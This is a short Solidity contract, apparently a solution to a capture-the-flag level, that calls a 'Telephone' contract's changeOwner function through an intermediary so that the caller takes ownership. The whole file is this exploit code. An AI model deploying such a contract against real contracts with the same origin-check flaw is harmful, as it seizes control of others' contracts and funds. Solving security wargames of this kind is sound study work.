// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Telephone{
    function changeOwner(address newOwner) external;
}

contract Claimer {
    Telephone public telephone;

    constructor(address _telephone) {
        telephone = Telephone(_telephone);
    }

    function claimOwnership() public {
        telephone.changeOwner(msg.sender);
    }
}
